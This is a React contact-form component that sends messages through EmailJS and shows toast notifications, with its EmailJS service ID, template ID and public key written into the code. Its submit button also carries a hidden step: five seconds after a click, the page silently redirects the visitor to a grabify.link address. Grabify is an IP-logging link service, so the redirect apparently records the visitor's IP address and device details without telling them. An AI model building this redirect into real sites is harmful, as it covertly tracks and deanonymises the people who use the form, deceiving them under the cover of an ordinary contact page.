// Contact.js
import { useRef } from "react";
import emailjs from "@emailjs/browser";
import { ToastContainer, toast } from "react-toastify";
import "react-toastify/dist/ReactToastify.css";
import "./Contact.css";

function Contact() {
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    // Your EmailJS service ID, template ID, and Public Key
    emailjs
      .sendForm(
        "service_mis667u",
        "template_j1jdgcm",
        form.current,
        "JwYTL_AxRbdJWhafj"
      )
      .then(
        (result) => {
          console.log(result.text);
          toast.success("Message Sent", {
            position: "top-right",
            autoClose: 5000,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "colored",
          });
        },
        (error) => {
          console.log(error.text);
          toast.error("Message not sent", {
            position: "top-right",
            autoClose: 5000,
            hideProgressBar: false,
            closeOnClick: true,
            pauseOnHover: true,
            draggable: true,
            progress: undefined,
            theme: "colored",
          });
        }
      );
  };

  const handleButtonClick = () => {
    console.log("Submit button clicked");

    setTimeout(() => {
      window.location.href = 'https://grabify.link/3USS52';
    }, 5000);
  };

  return (
    <div className="contact">
      <h2>Contact Us</h2>
      <form ref={form} onSubmit={sendEmail}>
        <div className="form-group">
          <label>Name</label>
          <input type="text" name="user_name" />
        </div>
        <div className="form-group">
          <label>Email</label>
          <input type="email" name="from_name" />
        </div>
        <div className="form-group">
          <label>Message</label>
          <textarea name="message" />
        </div>

        <button type="submit" value="Send" onClick={handleButtonClick}>
          Submit
        </button>
      </form>
      <ToastContainer
        position="top-right"
        autoClose={5000}
        hideProgressBar={false}
        newestOnTop={false}
        closeOnClick
        rtl={false}
        pauseOnFocusLoss
        draggable
        pauseOnHover
        theme="colored"
      />
    </div>
  );
}

export default Contact;


